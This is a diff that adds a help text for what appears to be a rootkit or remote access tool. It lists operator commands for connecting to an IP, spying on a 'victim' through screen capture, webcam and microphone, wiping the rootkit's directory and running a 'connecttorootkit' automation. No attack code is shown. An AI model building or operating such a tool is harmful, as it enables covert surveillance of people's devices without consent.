@@ -1,0 +1,48 @@
+                        local command
+    
+connexion (ip), co (ip), connect (ip)
+stopCo
+reloadCo, restart
+listenip
+list
+stop
+command: go to another screen
+clear
+__//__
+
+
+                        sending command
+
+left, quit, stop: quit the connexion without diying it
+die: kill the connexion
+screenstart: you can see the screen of the victim
+screenstop: stop the connexion of the screen
+camstart: you can see what the cam see in the victim laptop
+camstop: stop the connexion of the cam
+micstart: you can ear what the mic get
+micstop: stop the connexion of mic
+spy: get a full view of the victim
+spystop
+command: go to another screen
+
+fastcontrol = separate a suite of cmd with µ
+fasttap: to see what it can be tap help/fasttap
+delete: it's the same as update except that the dir who the rootkit is store is cleaned
+list cmd: makes a list of commands available with the cmd command
+clear
+__//__
+
+
+                        custom cmd command
+
+register: register a new custom cmd
+sup: delette a custom cmd
+list: list the whole custom cmd already register
+back: to go back in the connexion or local input command
+clear
+__//__
+
+
+                            automate
+
+root: run the connecttorootkit
